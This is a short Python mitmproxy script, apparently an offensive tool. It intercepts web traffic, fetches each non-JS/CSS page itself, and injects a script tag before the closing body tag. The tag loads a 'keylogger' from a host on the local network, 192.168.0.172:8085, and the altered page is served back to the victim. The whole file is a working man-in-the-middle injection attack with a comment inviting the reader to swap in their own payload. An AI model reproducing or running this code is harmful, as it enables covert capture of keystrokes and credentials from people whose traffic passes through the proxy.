#!/bin/python3

from mitmproxy import http
import requests

def request(flow):
	if not flow.request.pretty_url.endswith(".js") and not flow.request.pretty_url.endswith(".css"):
		url = requests.get(flow.request.pretty_url)
		print(url)
		htmltext = url.text
		htmltextr = htmltext.replace("</body>", js + "</body>")

		flow.response = http.HTTPResponse.make(
			200,
			htmltextr,
			{"content-type": "text/html"},
		)


#inject your html code here
js = '<script type="text/javascript" src="http://192.168.0.172:8085/keylogger"></script>'

